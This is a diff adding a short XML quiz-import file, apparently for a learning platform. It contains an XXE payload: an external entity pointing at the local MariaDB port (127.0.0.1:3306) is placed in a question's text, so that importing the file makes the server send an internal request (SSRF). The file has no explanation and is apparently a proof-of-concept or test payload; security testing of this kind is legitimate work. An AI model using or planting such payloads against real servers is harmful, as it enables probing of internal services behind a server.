@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE quiz [
+  <!ENTITY ssrf SYSTEM "http://127.0.0.1:3306/">
+]>
+<quiz>
+  <question type="description">
+    <name><text>SSRF MariaDB</text></name>
+    <questiontext format="html"><text><![CDATA[<p>&ssrf;</p>]]></text></questiontext>
+  </question>
+</quiz>
